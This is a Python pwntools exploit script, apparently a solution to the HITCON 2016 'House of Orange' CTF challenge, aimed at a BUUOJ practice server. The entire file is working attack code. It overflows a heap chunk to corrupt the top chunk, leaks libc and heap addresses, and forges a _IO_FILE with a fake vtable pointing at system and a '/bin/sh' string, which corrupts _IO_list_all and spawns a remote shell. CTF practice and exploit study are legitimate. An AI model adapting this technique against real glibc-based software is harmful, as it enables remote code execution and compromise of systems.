from pwn import *
r = remote('node3.buuoj.cn',26232)
#r = process('./houseoforange_hitcon_2016')
elf = ELF('./houseoforange_hitcon_2016')
libc = ELF('/libc-2.23.so')

def add(size,name):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('name :')
	r.sendline(str(size))
	r.recvuntil('Name :')
	r.send(name)
	r.recvuntil('Price of Orange:')
	r.sendline('1')
	r.recvuntil('Color of Orange:')
	r.sendline('1')

def show():
	r.recvuntil('Your choice :')
	r.sendline('2')

def edit(size,name):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Length of name :')
	r.sendline(str(size))
	r.recvuntil('Name:')
	r.send(name)
	r.recvuntil('Price of Orange:')
	r.sendline('1')
	r.recvuntil('Color of Orange:')
	r.sendline('1')

add(0x60,'fuck')
payload = 'a'*0x60+p64(0)+p64(0x21)+p64(0)*3+p64(0xf51)
edit((len(payload)),payload)
add(0x1000,'fuck')

add(0x400,'a'*8)
show()
r.recvuntil('a'*8)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x3c5188
log.success(hex(libc_base))
payload = 'a'*16
edit(len(payload),payload)
show()
r.recvuntil('a'*16)
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
heap_base = leak - 0x110
log.success(hex(heap_base))

_IO_list_all = libc_base + libc.sym['_IO_list_all']
system = libc_base + libc.sym['system']
log.success(hex(_IO_list_all))
log.success(hex(system))

vtable = heap_base + 0x618
payload = 'a'*0x400
payload += p64(0)+p64(0x21)+p64(0)*2

fake_file = '/bin/sh\x00'+p64(0x60) 
fake_file += p64(0) + p64(_IO_list_all - 0x10)
fake_file += p64(0) + p64(1)#check 
fake_file = fake_file.ljust(0xc0,'\x00')

payload += fake_file
payload += p64(0)*3
payload += p64(vtable)
payload += p64(0)*2
payload += p64(system)
edit(0x800,payload)

r.sendline('1')
r.interactive()